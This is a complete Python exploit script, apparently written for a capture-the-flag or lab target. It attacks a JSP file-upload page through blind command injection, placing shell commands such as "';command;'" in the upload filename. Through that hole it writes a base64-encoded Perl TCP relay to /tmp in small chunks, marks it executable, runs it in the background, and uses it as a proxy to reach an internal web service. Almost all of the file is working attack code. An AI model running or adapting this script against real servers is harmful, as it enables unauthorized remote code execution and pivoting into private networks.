#!/usr/bin/env python3
import requests
import time
import subprocess
import os
import base64

# Configuration
TARGET_URL = "http://localhost:8080"
TARGET_HOST = "localhost"  # Remote server hostname/IP
UPLOAD_URL = f"{TARGET_URL}/upload.jsp"

def create_socks5_code():
    """Create simple Perl TCP proxy code"""
    # Simple Perl TCP proxy only (no socat dependency)
    perl_code = '''use IO::Socket::INET;
$s=IO::Socket::INET->new(LocalHost=>"0.0.0.0",LocalPort=>1080,Proto=>"tcp",Listen=>5,Reuse=>1)or die"$!";
print"TCP proxy on 0.0.0.0:1080\n";
while($c=$s->accept()){
    if(fork()==0){
        $r=IO::Socket::INET->new(PeerHost=>"internal_web",PeerPort=>5000,Proto=>"tcp")or exit;
        while($c->sysread($d,4096)){
            $r->syswrite($d);
        }
        while($r->sysread($d,4096)){
            $c->syswrite($d);
        }
        exit;
    }
    $c->close();
}'''
    return perl_code

def split_base64_chunks(code, max_chunk_size=30):
    """Split Perl code into base64-encoded chunks"""
    # Encode the entire Perl code to base64
    base64_code = base64.b64encode(code.encode()).decode()
    chunks = []
    for i in range(0, len(base64_code), max_chunk_size):
        chunk = base64_code[i:i + max_chunk_size]
        if chunk:  # Only add non-empty chunks
            chunks.append(chunk)
    return chunks

def create_short_payload(command):
    """Create shorter payload by using printf instead of echo -ne"""
    # Replace echo -ne with printf for shorter payloads
    short_command = command.replace("echo -ne", "printf")
    return f"';{short_command};'"

def create_payload(command):
    """Create filename payload for Blind Command Injection
    JSP executes: echo 'File received: [filename]' > /dev/null
    So we need: filename = "'; command; '"
    This becomes: echo 'File received: '; command; ' > /dev/null
    """
    payload = f"';{command};'"
    return payload

def upload_with_payload(filename):
    """Upload file with malicious filename for command injection"""
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    
    body = f"""--{boundary}\r
Content-Disposition: form-data; name="file"; filename="{filename}"\r
Content-Type: text/plain\r
\r
dummy content\r
--{boundary}--\r
"""
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body))
    }
    
    try:
        response = requests.post(UPLOAD_URL, data=body, headers=headers, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Upload error: {e}")
        return False

def verify_payload_length(payload, step_name):
    """Verify payload length is under 80 characters"""
    if len(payload) >= 80:
        print(f"ERROR: {step_name} payload too long! ({len(payload)} chars)")
        print(f"Payload: {payload}")
        return False
    elif len(payload) >= 60:
        print(f"WARNING: {step_name} payload is long ({len(payload)} chars)")
    return True

def check_remote_file_exists(file_path):
    """Check if a file exists on remote server using command injection
    Uses a side-channel technique: try to create a file with same name
    If file exists, we'll get different behavior
    """
    # Simple check: try to remove the file and see if it exists
    check_command = f"test -f {file_path} && echo OK>/tmp/exists"
    payload = create_payload(check_command)
    
    verify_payload_length(payload, "File check")
    
    success = upload_with_payload(payload)
    if not success:
        return False
    
    time.sleep(1)
    
    return True

def test_command_injection():
    """Test if command injection is working using Blind techniques"""
    print("1. Testing command injection...")
    
    # Test 1: Create test file
    test_command = "touch /tmp/testfile"
    payload = create_payload(test_command)
    
    verify_payload_length(payload, "Test command")
    
    print(f"   Testing with payload: {payload}")
    success = upload_with_payload(payload)
    if not success:
        print("   Test command upload failed")
        return False
    
    time.sleep(1)
    
    # Test 2: Create marker file
    marker_command = "echo OK>/tmp/m"
    marker_payload = create_payload(marker_command)
    
    verify_payload_length(marker_payload, "Marker command")
    
    success = upload_with_payload(marker_payload)
    if not success:
        print("   Marker command upload failed")
        return False
    
    time.sleep(1)
    
    print("   Command injection test completed (Blind - assuming success)")
    return True

def upload_base64_chunks():
    """Upload base64-encoded Perl code in chunks"""
    print("2. Uploading base64-encoded Perl code...")
    
    socks_code = create_socks5_code()
    base64_chunks = split_base64_chunks(socks_code, max_chunk_size=10)
    
    print(f"   Perl code length: {len(socks_code)} characters")
    print(f"   Number of base64 chunks: {len(base64_chunks)}")
    
    # First, create empty file
    create_command = "echo -n > /tmp/socks.pl"
    create_payload_cmd = create_short_payload(create_command)
    
    if not verify_payload_length(create_payload_cmd, "Create file"):
        print("   Failed to create initial file")
        return False
    
    print("   Creating initial file...")
    if not upload_with_payload(create_payload_cmd):
        print("   Failed to create initial file")
        return False
    
    time.sleep(0.5)
    
    # Upload each base64 chunk
    for i, chunk in enumerate(base64_chunks):
        command = f"echo '{chunk}' | base64 -d >> /tmp/socks.pl"
        payload = create_short_payload(command)
        
        if not verify_payload_length(payload, f"Base64 chunk {i+1}"):
            print(f"   ERROR: Base64 chunk {i+1} payload too long ({len(payload)} chars)")
            print(f"   Chunk: {chunk}")
            return False
        
        print(f"   Uploading base64 chunk {i+1}/{len(base64_chunks)}...")
        success = upload_with_payload(payload)
        if not success:
            print(f"   Base64 chunk {i+1} upload failed")
            return False
        
        # Check file size every 10 chunks
        if (i + 1) % 10 == 0:
            check_command = f"ls /tmp/socks.pl>>/tmp/c{i+1}"
            check_payload = create_short_payload(check_command)
            
            if verify_payload_length(check_payload, f"Check {i+1}"):
                upload_with_payload(check_payload)
                time.sleep(0.2)
        
        time.sleep(0.1)
    
    # Final verification
    final_check = "ls /tmp/socks.pl>>/tmp/f"
    final_payload = create_short_payload(final_check)
    
    if verify_payload_length(final_payload, "Final check"):
        upload_with_payload(final_payload)
        time.sleep(0.5)
    
    print("   All base64 chunks uploaded successfully")
    return True

def restore_perl_file():
    """Verify Perl file was created and make it executable"""
    print("3. Verifying Perl file creation...")
    
    # Check if file exists and get size
    verify_command = "ls -l /tmp/socks.pl>>/tmp/v"
    verify_payload = create_short_payload(verify_command)
    
    verify_payload_length(verify_payload, "Verify command")
    
    success = upload_with_payload(verify_payload)
    if not success:
        print("   Verify command failed")
        return False
    
    time.sleep(0.5)
    
    # Validate Perl syntax
    syntax_check = "perl -c /tmp/socks.pl>/tmp/syntax 2>&1"
    syntax_payload = create_short_payload(syntax_check)
    
    verify_payload_length(syntax_payload, "Syntax check")
    
    success = upload_with_payload(syntax_payload)
    if not success:
        print("   Syntax check failed")
        return False
    
    time.sleep(0.5)
    
    # Check syntax validation result file size
    syntax_result = "ls -l /tmp/syntax>>/tmp/sr"
    syntax_result_payload = create_short_payload(syntax_result)
    
    verify_payload_length(syntax_result_payload, "Syntax result")
    
    success = upload_with_payload(syntax_result_payload)
    if not success:
        print("   Syntax result check failed")
        return False
    
    time.sleep(0.5)
    
    # Make file executable
    chmod_command = "chmod +x /tmp/socks.pl"
    chmod_payload = create_short_payload(chmod_command)
    
    verify_payload_length(chmod_payload, "Chmod command")
    
    success = upload_with_payload(chmod_payload)
    if not success:
        print("   Chmod command failed")
        return False
    
    time.sleep(0.5)
    
    # Final verification with file size
    final_verify = "wc -c /tmp/socks.pl>>/tmp/fv"
    final_payload = create_short_payload(final_verify)
    
    verify_payload_length(final_payload, "Final verify")
    
    success = upload_with_payload(final_payload)
    if not success:
        print("   Final verify command failed")
        return False
    
    time.sleep(0.5)
    
    print("   Perl file verification completed (Blind - assuming success)")
    return True

def execute_socks5():
    """Execute TCP proxy"""
    print("4. Executing TCP proxy...")
    
    # Execute proxy in background with perl
    execute_command = "perl /tmp/socks.pl&"
    payload = create_short_payload(execute_command)
    
    verify_payload_length(payload, "Execute command")
    
    success = upload_with_payload(payload)
    if not success:
        print("   Execute command failed")
        return False
    
    print("   TCP proxy execution command sent")
    
    # Wait for proxy to start
    print("   Waiting for TCP proxy to start (3 seconds)...")
    time.sleep(3)
    
    # Check if process is running
    check_command = "pgrep -f socks.pl>/tmp/p"
    check_payload = create_short_payload(check_command)
    
    verify_payload_length(check_payload, "Process check")
    
    success = upload_with_payload(check_payload)
    if not success:
        print("   Process check failed")
        return False
    
    time.sleep(1)
    
    # Check if port 1080 is listening
    port_check = "netstat -ltnp|grep 1080>/tmp/port"
    port_payload = create_short_payload(port_check)
    
    verify_payload_length(port_payload, "Port check")
    
    success = upload_with_payload(port_payload)
    if not success:
        print("   Port check failed")
        return False
    
    time.sleep(1)
    
    print("   TCP proxy execution completed (Blind - assuming success)")
    return True

def test_socks5_connection():
    """Test TCP proxy connection"""
    print("5. Testing TCP proxy connection...")
    print(f"   Note: TCP proxy is running on {TARGET_HOST}:1080")
    print("   If you need local access, use SSH port forwarding:")
    print(f"   ssh -L 1080:127.0.0.1:1080 user@{TARGET_HOST}")
    
    try:
        # Test with curl using TCP proxy on remote server
        result = subprocess.run([
            'curl', '--proxy', f'{TARGET_HOST}:1080',
            '--connect-timeout', '5',
            '--max-time', '10',
            'http://internal_web:5000/'
        ], capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            if "Congratulation" in result.stdout:
                print("   SUCCESS! TCP proxy is working!")
                print(f"   Response: {result.stdout.strip()}")
                return True
            else:
                print(f"   Connected but unexpected response: {result.stdout[:100]}...")
                return False
        else:
            print(f"   Connection failed (exit code: {result.returncode})")
            print(f"   stderr: {result.stderr}")
            print(f"   This might be expected if {TARGET_HOST}:1080 is not accessible from this machine")
            print(f"   Try SSH port forwarding: ssh -L 1080:127.0.0.1:1080 user@{TARGET_HOST}")
            return False
            
    except subprocess.TimeoutExpired:
        print("   Timeout testing SOCKS5 connection")
        return False
    except Exception as e:
        print(f"   Error testing SOCKS5 connection: {e}")
        return False

def main():
    print("=== Blind Command Injection SOCKS5 Proxy Exploit ===")
    print(f"Target: {TARGET_URL}")
    print(f"Target Host: {TARGET_HOST}")
    print("Pattern: '; command; '")
    print("JSP executes: echo 'File received: [filename]' > /dev/null")
    print("Note: TCP proxy will be installed on the remote server")
    
    # Step 1: Test command injection
    if not test_command_injection():
        print("\n=== EXPLOIT FAILED ===")
        print("Command injection test failed. Exploit cannot proceed.")
        return
    
    # Step 2: Upload base64 chunks
    if not upload_base64_chunks():
        print("\n=== EXPLOIT FAILED ===")
        print("Base64 upload failed.")
        return
    
    # Step 3: Verify Perl file creation
    if not restore_perl_file():
        print("\n=== EXPLOIT FAILED ===")
        print("Perl file verification failed.")
        return
    
    # Step 4: Execute SOCKS5 proxy
    if not execute_socks5():
        print("\n=== EXPLOIT FAILED ===")
        print("SOCKS5 proxy execution failed.")
        return
    
    # Step 5: Test SOCKS5 connection
    if test_socks5_connection():
        print("\n=== EXPLOIT SUCCESSFUL ===")
        print(f"TCP proxy is running on {TARGET_HOST}:1080")
        print(f"You can now use it with: curl --proxy {TARGET_HOST}:1080 http://internal_web:5000/")
        print("\nFor local access, use SSH port forwarding:")
        print(f"ssh -L 1080:127.0.0.1:1080 user@{TARGET_HOST}")
        print("Then use: curl --proxy 127.0.0.1:1080 http://internal_web:5000/")
    else:
        print("\n=== EXPLOIT PARTIALLY SUCCESSFUL ===")
        print("TCP proxy was installed on the remote server, but connection test failed.")
        print(f"This might be expected if {TARGET_HOST}:1080 is not accessible from this machine.")
        print("\nTo test locally, use SSH port forwarding:")
        print(f"ssh -L 1080:127.0.0.1:1080 user@{TARGET_HOST}")
        print("Then test with: curl --proxy 127.0.0.1:1080 http://internal_web:5000/")

if __name__ == "__main__":
    main()
